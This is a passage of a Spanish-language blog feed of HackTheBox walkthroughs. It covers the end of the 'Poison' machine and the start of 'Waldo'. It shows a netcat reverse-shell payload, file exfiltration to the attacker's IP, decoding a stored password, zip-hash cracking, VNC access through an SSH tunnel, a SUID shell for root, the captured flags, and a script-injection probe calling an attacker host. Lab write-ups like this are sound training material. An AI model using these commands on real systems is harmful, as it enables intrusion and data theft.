    <p>Ahora le damos a forward para enviar la petición.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.84] 13393
sh: can<span class="s1">'t access tty; job control turned off
$ whoami
www
$ 
</span></code></pre></div></div>

<ul>
  <li>No nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script: <span class="nt">-c</span>: No such file or directory
Script started, output file is /dev/null
Script started, output file is /dev/null

Script <span class="k">done</span>, output file is /dev/null
</code></pre></div></div>

<ul>
  <li>Hay un archivo llamado <code class="language-plaintext highlighter-rouge">pwdbackup.txt</code> por el nombre ya sabemos que es importante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">pwd</span>
/usr/local/www/apache24/data
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 72
drwxr-xr-x  2 root  wheel   512 Mar 19  2018 <span class="nb">.</span>
drwxr-xr-x  6 root  wheel   512 Jan 24  2018 ..
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 browse.php
<span class="nt">-rw-r--r--</span>  1 root  wheel   289 Jan 24  2018 index.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    27 Jan 24  2018 info.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    33 Jan 24  2018 ini.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    90 Jan 24  2018 listfiles.php
<span class="nt">-rw-r--r--</span>  1 root  wheel    20 Jan 24  2018 phpinfo.php
<span class="nt">-rw-r--r--</span>  1 root  wheel  1267 Mar 19  2018 pwdbackup.txt
</code></pre></div></div>

<ul>
  <li>Y tenemos esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pwdbackup.txt
This password is secure, it<span class="s1">'s encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
</span></code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">decode</code> 13 veces obtendremos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Q2hhcml4ITIjNCU2JjgoMA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
Charix!2#4%6&amp;8<span class="o">(</span>0           
</code></pre></div></div>

<h2 id="shell-as-charix">Shell as charix</h2>

<ul>
  <li>Si recordamos tenemos un usuario que se llama <code class="language-plaintext highlighter-rouge">charix</code> y nos podemos conectar por SSH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84
The authenticity of host <span class="s1">'10.10.10.84 (10.10.10.84)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.84<span class="s1">' (ED25519) to the list of known hosts.
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Want to see how much virtual memory you'</span>re using? Just <span class="nb">type</span> <span class="s2">"swapinfo"</span> to
be shown information about the usage of your swap partitions.
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ %
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % <span class="nb">cat </span>user.txt 
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">secret.zip</code> vamos a enviarlo a nuestra maquina de atacante para analizarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> secret.zip
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora lo enviamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % nc 10.10.14.17 443 &lt; secret.zip
</code></pre></div></div>

<ul>
  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">secret</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l secret.zip

7-Zip 24.07 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2024 Igor Pavlov : 2024-06-19
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 166 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Listing archive: secret.zip

<span class="nt">--</span>
Path <span class="o">=</span> secret.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 166

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2018-01-24 11:01:14 .R..A            8           20  secret
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2018-01-24 11:01:14                  8           20  1 files
</code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">unzip</code> nos pide contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code> para extraer un hash y posteriormente crackearlo para obtener la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john secret.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 secret.zip/secret PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>20, <span class="nv">decmplen</span><span class="o">=</span>8, <span class="nv">crc</span><span class="o">=</span>77537827 <span class="nv">ts</span><span class="o">=</span>9827 <span class="nv">cs</span><span class="o">=</span>7753 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<ul>
  <li>Y bueno no tenemos suerte por que no esta la contraseña en el <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:12 DONE <span class="o">(</span>2024-09-08 13:06<span class="o">)</span> 0g/s 1188Kp/s 1188Kc/s 1188KC/s <span class="o">!</span>LUVDKR!..<span class="k">*</span>7¡Vamos!
Session completed. 
                            
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es reutilizar la contraseña que ya tenemos para ver si con esa funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
 extracting: secret    
</code></pre></div></div>

<ul>
  <li>Pero no vemos gran cosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn secret
��[|Ֆz!
</code></pre></div></div>

<ul>
  <li>Si enumeramos puertos abiertos internamente vemos los siguientes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % netstat <span class="nt">-na</span> <span class="nt">-p</span> tcp
Active Internet connections <span class="o">(</span>including servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address          Foreign Address        <span class="o">(</span>state<span class="o">)</span>
tcp4       0     44 10.10.10.84.22         10.10.14.17.57266      ESTABLISHED
tcp4       0      0 10.10.10.84.13393      10.10.14.17.443        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.17.52658      CLOSE_WAIT
tcp4       0      0 127.0.0.1.25           <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5801         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5901         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
charix@Poison:~ % 
</code></pre></div></div>

<ul>
  <li>Encontramos un proceso interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % ps <span class="nt">-faux</span>
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
root    11 100.0  0.0      0    16  -  RL   19:54   72:52.21 <span class="o">[</span>idle]
root     0   0.0  0.0      0   160  -  DLs  19:54    0:00.01 <span class="o">[</span>kernel]
root     1   0.0  0.1   5408  1040  -  ILs  19:54    0:00.00 /sbin/init <span class="nt">--</span>
root     2   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto]
root     3   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto returns]
root     4   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>cam]
root     5   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>mpt_recovery0]
root     6   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>sctp_iterator]
root     7   0.0  0.0      0    16  -  DL   19:54    0:00.25 <span class="o">[</span>rand_harvestq]
root     8   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod1]
root     9   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod2]
root    10   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>audit]
root    12   0.0  0.1      0   736  -  WL   19:54    0:01.65 <span class="o">[</span>intr]
root    13   0.0  0.0      0    48  -  DL   19:54    0:00.00 <span class="o">[</span>geom]
root    14   0.0  0.0      0   160  -  DL   19:54    0:00.15 <span class="o">[</span>usb]
root    15   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod3]
root    16   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod4]
root    17   0.0  0.0      0    48  -  DL   19:54    0:00.07 <span class="o">[</span>pagedaemon]
root    18   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>vmdaemon]
root    19   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>pagezero]
root    20   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>bufdaemon]
root    21   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>bufspacedaemon]
root    22   0.0  0.0      0    16  -  DL   19:54    0:00.04 <span class="o">[</span>syncer]
root    23   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>vnlru]
root   319   0.0  0.5   9560  5052  -  Ss   19:55    0:00.15 /sbin/devd
root   390   0.0  0.2  10500  2452  -  Ss   19:55    0:00.06 /usr/sbin/syslogd <span class="nt">-s</span>
root   543   0.0  0.5  56320  5400  -  S    19:55    0:01.97 /usr/local/bin/vmtoolsd <span class="nt">-c</span> /usr/local/share/vmware-tools/tools.con
root   620   0.0  0.7  57812  7052  -  Is   19:55    0:00.00 /usr/sbin/sshd
root   625   0.0  1.1  99172 11516  -  Ss   19:56    0:00.09 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    637   0.0  1.3 101220 12776  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    638   0.0  1.2 101220 12072  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    639   0.0  1.2 101220 11952  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    640   0.0  1.3 101220 12788  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    641   0.0  1.3 101220 12812  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
root   642   0.0  0.6  20636  6140  -  Ss   19:57    0:00.05 sendmail: accepting connections <span class="o">(</span>sendmail<span class="o">)</span>
smmsp  645   0.0  0.6  20636  5808  -  Is   19:57    0:00.00 sendmail: Queue runner@00:30:00 <span class="k">for</span> /var/spool/clientmqueue <span class="o">(</span>sendm
root   649   0.0  0.2  12592  2436  -  Is   19:57    0:00.01 /usr/sbin/cron <span class="nt">-s</span>
www    706   0.0  1.2 101220 11952  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    708   0.0  1.2 101220 11988  -  S    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    712   0.0  1.3 101220 12792  -  I    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    713   0.0  1.2 101220 12140  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    783   0.0  0.3  13180  2664  -  I    20:46    0:00.00 sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.
www    786   0.0  0.2   8324  1932  -  I    20:46    0:00.00 <span class="nb">cat</span> /tmp/f
www    787   0.0  0.3  13180  2680  -  I    20:46    0:00.00 /bin/sh <span class="nt">-i</span>
www    788   0.0  0.2  10928  2000  -  I    20:46    0:00.00 nc 10.10.14.17 443
root   807   0.0  0.8  85228  7840  -  Is   20:56    0:00.01 sshd: charix <span class="o">[</span>priv] <span class="o">(</span>sshd<span class="o">)</span>
charix 810   0.0  0.8  85228  7872  -  S    20:56    0:00.01 sshd: charix@pts/1 <span class="o">(</span>sshd<span class="o">)</span>
root   529   0.0  0.9  23620  8868 v0- I    19:55    0:00.02 Xvnc :1 <span class="nt">-desktop</span> X <span class="nt">-httpd</span> /usr/local/share/tightvnc/classes <span class="nt">-auth</span> 
root   540   0.0  0.7  67220  7056 v0- I    19:55    0:00.01 xterm <span class="nt">-geometry</span> 80x24+10+10 <span class="nt">-ls</span> <span class="nt">-title</span> X Desktop
root   541   0.0  0.5  37620  5312 v0- I    19:55    0:00.00 twm
root   696   0.0  0.2  10484  2076 v0  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv0
root   697   0.0  0.2  10484  2076 v1  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv1
root   698   0.0  0.2  10484  2076 v2  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv2
root   699   0.0  0.2  10484  2076 v3  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv3
root   700   0.0  0.2  10484  2076 v4  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv4
root   701   0.0  0.2  10484  2076 v5  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv5
root   702   0.0  0.2  10484  2076 v6  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv6
root   703   0.0  0.2  10484  2076 v7  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv7
root   617   0.0  0.4  19660  3616  0  Is+  19:55    0:00.00 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 811   0.0  0.4  19660  3796  1  Ss   20:56    0:00.01 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 837   0.0  0.3  21208  2660  1  R+   21:07    0:00.00 ps <span class="nt">-faux</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que se esta corriendo <code class="language-plaintext highlighter-rouge">tightvnc</code> ya que el usuario root lo esta corriendo <a href="https://www.tightvnc.com/">https://www.tightvnc.com/</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican como auditar ese servicio <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ vncviewer
</code></pre></div></div>

<ul>
  <li>Nos tenemos que conectar pero el puerto solo esta abierto internamente así que haremos <code class="language-plaintext highlighter-rouge">port forwarding</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84 <span class="nt">-D</span> 1080
</code></pre></div></div>

<ul>
  <li>Todo esta funcionando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span>:1080
COMMAND   PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     62161 miguelrega7    4u  IPv6 192426      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     62161 miguelrega7    5u  IPv4 192427      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos lo que nos pide la herramienta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains vncviewer 127.0.0.1:5901 <span class="nt">-passwd</span> secret
</code></pre></div></div>

<ul>
  <li>Estamos como root.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/9.png" />
</p>

<h2 id="root-flag">Root flag</h2>

<ul>
  <li>Vamos a poner la <code class="language-plaintext highlighter-rouge">sh</code> con permisos <code class="language-plaintext highlighter-rouge">SUID</code> para estar como <code class="language-plaintext highlighter-rouge">root</code> desde nuestra consola.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/10.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % /bin/sh
Cannot <span class="nb">read </span>termcap database<span class="p">;</span>
using dumb terminal settings.
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
716d04b188419cf2bb99d891272361f5
<span class="c"># </span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Waldo (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html" rel="alternate" type="text/html" title="HackTheBox - Waldo (medium)" /><published>2024-08-25T00:00:00-06:00</published><updated>2024-08-25T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/de5b8119858c9c3ae0fcd4bf71587939.png" />
</p>

<ul>
  <li>Waldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environments.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.87 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-25 11:08 CST
Nmap scan report <span class="k">for </span>10.10.10.87
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e <span class="o">(</span>RSA<span class="o">)</span>
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.12.2
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: List Manager
|_Requested resource was /list.html
|_http-server-header: nginx/1.12.2
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estas son las tecnologías que están corriendo en el servicio web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="sr">/list.html], X-Powered-By[PHP/</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="o">/</span><span class="n">list</span><span class="p">.</span><span class="nf">html</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">List</span> <span class="no">Manager</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/1.png" />
</p>

<ul>
  <li>Vemos 2 listas y un botón de borrar si borramos una vemos que si se borra.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/2.png" />
</p>

<ul>
  <li>Si presionamos en el botón de list2 nos muestra contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/3.png" />
</p>

<ul>
  <li>Si damos click en <code class="language-plaintext highlighter-rouge">PWN</code> nos deja editarla.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/4.png" />
</p>

<ul>
  <li>Vamos añadir una nueva dando <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">add</code> y inyectar código <code class="language-plaintext highlighter-rouge">html</code> para ver si se refleja dentro de list 1.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>hola<span class="nt">&lt;/h1&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/5.png" />
</p>

<ul>
  <li>Como se esta interpretando la etiqueta vamos a ejecutar un servidor http con python3 para ver si recibimos alguna petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Vamos a inyectar lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.23:8080/zi.js"</span><span class="o">&gt;</span>&lt;/script&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno si esperamos varios minutos no recibimos nada así que descartamos posibles ataques mediante las etiquetas html de momento.</p>
  </li>
  <li>
    <p>Vamos hacer Fuzzing para ver si encontramos nuevas rutas.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hl</span><span class="o">=</span>0 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://10.10.10.87/list.html/FUZZ
